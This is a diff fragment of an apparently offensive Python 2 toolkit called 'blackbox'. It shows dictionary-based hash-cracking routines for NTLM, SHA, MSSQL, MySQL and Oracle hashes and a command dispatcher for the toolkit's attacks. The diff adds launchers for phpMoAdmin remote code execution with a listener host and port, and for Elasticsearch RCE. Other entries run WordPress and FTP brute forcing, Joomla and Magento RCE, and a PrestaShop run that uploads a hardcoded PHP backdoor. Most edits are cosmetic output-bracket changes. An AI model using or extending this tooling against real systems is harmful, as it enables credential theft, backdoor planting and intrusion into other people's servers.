-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 	def sha256(self, sha256, wordlist):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SHA256 HASH PATH : "+sha256+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA256 HASH PATH : "+sha256+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		word = wordlist.readlines()
@@ -967,17 +1032,17 @@ class cracker:
 				o=o.strip()
 				wordlistsha1 = hashlib.sha256(o).hexdigest()
 				if i==wordlistsha1:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass		
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 	def sha384(self, sha384, wordlist):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SHA384 HASH PATH : "+sha384+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA384 HASH PATH : "+sha384+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		word = wordlist.readlines()
@@ -990,17 +1055,17 @@ class cracker:
 				o=o.strip()
 				wordlistsha1 = hashlib.sha384(o).hexdigest()
 				if i==wordlistsha1:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass		
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 	def sha512(self, sha512, wordlist):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SHA512 HASH PATH : "+sha512+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA512 HASH PATH : "+sha512+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		word = wordlist.readlines()
@@ -1013,17 +1078,17 @@ class cracker:
 				o=o.strip()
 				wordlistsha1 = hashlib.sha512(o).hexdigest()
 				if i==wordlistsha1:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass		
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 	def ntlm(self,wordlist, ha):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" NTLM HASH PATH : "+ha+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" NTLM HASH PATH : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		wordlist = wordlist.readlines()
@@ -1035,17 +1100,17 @@ class cracker:
 			h = nthash.encrypt(word)
 			for has in ha:
 				if has == h:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass		
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 	def mssql2000(self,wordlist, ha):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" MSSQL2000 HASH PATH : "+ha+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MSSQL2000 HASH PATH : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		wordlist = wordlist.readlines()
@@ -1058,17 +1123,17 @@ class cracker:
 				has = has.strip()
 				h = m20.verify(has,word)
 				if h ==True:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass		
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 	def mssql2005(self,wordlist, ha):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" MSSQL2005 HASH PATH : "+ha+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MSSQL2005 HASH PATH : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		wordlist = wordlist.readlines()
@@ -1081,18 +1146,18 @@ class cracker:
 				has = has.strip()
 				h = m25.verify(has,word)
 				if h ==True:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 #mysql323
 	def mysql323(self,wordlist, ha):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" MYSQL323 HASH PATH  : "+ha+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MYSQL323 HASH PATH  : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		wordlist = wordlist.readlines()
@@ -1105,18 +1170,18 @@ class cracker:
 				has = has.strip()
 				h = mysql323.verify(has,word)
 				if h ==True:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 #mysql41
 	def mysql41(self,wordlist, ha):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" MYSQL41 HASH PATH   : "+ha+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MYSQL41 HASH PATH   : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		wordlist = wordlist.readlines()
@@ -1129,17 +1194,17 @@ class cracker:
 				has = has.strip()
 				h = mysql41.verify(has,word)
 				if h ==True:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 	def oracle11(self,wordlist, ha):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" ORACLE HASH PATH    : "+ha+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" ORACLE HASH PATH    : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		wordlist = wordlist.readlines()
@@ -1152,14 +1217,14 @@ class cracker:
 				has = has.strip()
 				h = oracle11.verify(has,word)
 				if h ==True:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 
 ####################################
 ##                                ##
@@ -1167,6 +1232,7 @@ class cracker:
 ##                                ##
 ####################################
 def __main__():
+	print "\033c"
 	__banner__()
 	for arg in sys.argv:
 		if (arg=="--help" or arg=="-h"):
@@ -1174,12 +1240,9 @@ def __main__():
 		if (arg=="wordpress_brute"):
 			wp_hp = color.W+color.BOLD+sys.argv[0]+" wordpress_brute --url [URL OF TARGET] -u/--username [USERNAME OF ADMIN] -w/--wordlist [PASSWORD WORDLIST]\nExample: "+sys.argv[0]+" wordpress_brute xxxxxxxx.com -w /root/rockyou.txt"+color.ENDC
 			parser = OptionParser(usage=wp_hp)
-			parser.add_option("--url",
-				help="URL OF Target")
-			parser.add_option("--username","-u",
-				help="Username of Wordpress")
-			parser.add_option("--wordlist","-w",
-				help="Wordlist for attack target")
+			parser.add_option("--url",help="URL OF TARGET")
+			parser.add_option("--username","-u",help="Username of Wordpress")
+			parser.add_option("--wordlist","-w",help="Wordlist for attack target")
 			(options,args) = parser.parse_args()
 			url = options.url
 			username = options.username
@@ -1211,8 +1274,6 @@ def __main__():
 				dnsinfo().viewdns(ip)
 			if ip and hackertarget==True:
 				dnsinfo().hackertarget(ip)
-
-
 		if (arg=="rce_joomla"):
 			rj_hp = color.W+color.BOLD+sys.argv[0]+" rce_joomla -w/--wordlist [SELECT PATH OF URLs SAVED IN WORDLIST]\nExample: "+sys.argv[0]+" rce_joomla -w joomla3.txt"+color.ENDC
 			parser = OptionParser(usage=rj_hp)
@@ -1222,7 +1283,6 @@ def __main__():
 			wordlist = options.wordlist
 			if wordlist:
 				exploit().joomla(wordlist)
-
 		if (arg=="rce_magento"):
 			rm_hp = color.W+color.BOLD+sys.argv[0]+" rce_magento -w/--wordlist [SELECT PATH OF URLs SAVED IN WORDLIST]\nExample: "+sys.argv[0]+" rce_magento -w magento.txt"+color.ENDC
 			parser = OptionParser(usage=rm_hp)
@@ -1232,10 +1292,33 @@ def __main__():
 			wordlist = options.wordlist
 			if wordlist:
 				exploit().magento(wordlist)
-
-
+		if (arg=="rce_pmo"):
+			pmo="blackbox rce_pmo --target/-t http://192.168.1.101/phpMoAdmin/index.php --lhost 192.168.1.5 --lport 80"
+			parser = OptionParser(usage=pmo)
+			parser.add_option("--target","-t",
+				help="Target link")
+			parser.add_option("--lhost",
+				help="local HOST")
+			parser.add_option("--lport",
+				help="local PORT")
+			(options,args) = parser.parse_args()
+			target = options.target
+			lhost = options.lhost
+			lport = options.lport
+			if target and lhost and lport:
+				exploit().phpmoadmin(target, lhost, lport)
+		if (arg=="rce_elastic"):
+			els="blackbox rce_elastic --target/-t elasticsearch.local"
+			parser = OptionParser(usage=els)
+			parser.add_option("--target","-t",
+				help="Target link")
+			(options,args) = parser.parse_args()
+			target = options.target
+			if target:
+				exploit().elastic(target)
 		if (arg=="google_dorker"):
 			gd_hp = color.W+color.BOLD+sys.argv[0]+' google_dorker -d/--dork="[DORK]" --level [NUMBER OF PAGE] --[LFI/RCE/XSS/SQLi!]\nExample: '+sys.argv[0]+' google_dorker --dork="php?id=" --level 10 '+color.ENDC
+			
 			parser = OptionParser(usage=gd_hp)
 			parser.add_option("--dork","-d",
 				help="Dork for get URL")
@@ -1322,6 +1405,8 @@ def __main__():
 			parser.add_option("--ip")
 			parser.add_option("--dork","-d",
 				help="Dork for get URL")
+			parser.add_option("--lists","-l",
+				help="Dork for get URL")
 			parser.add_option("--lfi",
 			help="Scan Founded website from LFI", action="store_true")
 			parser.add_option("--sqli",
@@ -1332,13 +1417,13 @@ def __main__():
 			help="Scan Founded website from XSS", action="store_true")
 			(options,args) = parser.parse_args()
 			ip = options.ip
-			dork = options.dork
+			dork = options.dork;lists=options.lists
 			lfi = options.lfi
 			sqli = options.sqli
 			rce = options.rce
 			xss = options.xss
 			if ip and dork:
-				dorker().bing(ip,dork)
+				dorker().bing_ip(ip,dork)
 			if ip and dork and lfi==True:
 				print (color.R+color.BOLD+"LFI Scanner : "+color.ENDC)
 				burl= dorker().burl
@@ -1364,7 +1449,7 @@ def __main__():
 					urll= urll.strip()
 					scanner().xss(urll)
 
-			if ip and lists:
+			if lists:
 				lists = open(lists, "r");lists=lists.readlines()
 				for dorks in lists:
 					dorks=dorks.strip()
@@ -1455,12 +1540,10 @@ def __main__():
 			parser = OptionParser(usage=pe_hp)
 			parser.add_option("--lists","-l",
 				help="wordlist path")
-			parser.add_option("--script","-s",
-				help="Path of php backdoor")
 			(options,args) = parser.parse_args()
 			lists = options.lists
-			script = options.script
-			if lists and script:
+			if lists:
+				script = "/opt/blackbox/payload/up.php"
 				exploit().presta_run(lists,script)
 		if (arg=="ftp_brute"):
 			fb_hp = color.W+color.BOLD+sys.argv[0]+' ftp_brute --ip [IP ADDRESS] -u/--username [USERNAME OF FTP LOGIN] -w/--wordlist [PATH OF WORDLIST]\nExample: '+sys.argv[0]+' ftp_brute --ip 192.168.xxx.xx -u root -w password.txt'+color.ENDC
@@ -1476,8 +1559,8 @@ def __main__():
 			username = options.username
 			wordlist = options.wordlist
 			if ip and username and wordlist:
-				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" USERNAME : "+username+color.ENDC)
-				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST : "+wordlist+color.ENDC)
+				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" USERNAME : "+username+color.ENDC)
+				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST : "+wordlist+color.ENDC)
 				wordlist = open(wordlist,"r")
 				wordlist = wordlist.readlines()
 				for password in  wordlist:
@@ -1498,8 +1581,8 @@ def __main__():
 			username = options.username
 			wordlist = options.wordlist
 			if ip and username and wordlist:
-				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" USERNAME : "+username+color.ENDC)
-				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST : "+wordlist+color.ENDC)
+				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" USERNAME : "+username+color.ENDC)
+				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST : "+wordlist+color.ENDC)
 				wordlist = open(wordlist,"r")
 				wordlist = wordlist.readlines()
 				for password in  wordlist:
@@ -1533,28 +1616,28 @@ def __main__():
 			cgi = options.cgi
 			brf = options.brf
 			if url and php==True:
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SOURCE             : PHP"+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : PHP"+color.ENDC)
 				admin_finder().php_admin(url)
 			if url and asp==True:
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SOURCE             : ASP"+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : ASP"+color.ENDC)
 				admin_finder().asp_admin(url)
 			if url and cfm==True:
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SOURCE             : CFM"+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : CFM"+color.ENDC)
 				admin_finder().cfm_admin(url)
 			if url and js==True:
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SOURCE             : JS"+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : JS"+color.ENDC)
 				admin_finder().js_admin(url)
 			if url and cgi==True:
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SOURCE             : CGI"+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : CGI"+color.ENDC)
 				admin_finder().cgi_admin(url)
 			if url and brf==True:
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
-				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SOURCE             : BRF"+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : BRF"+color.ENDC)
 				admin_finder().brf_admin(url)
 
 		if (arg=="scan_list"):
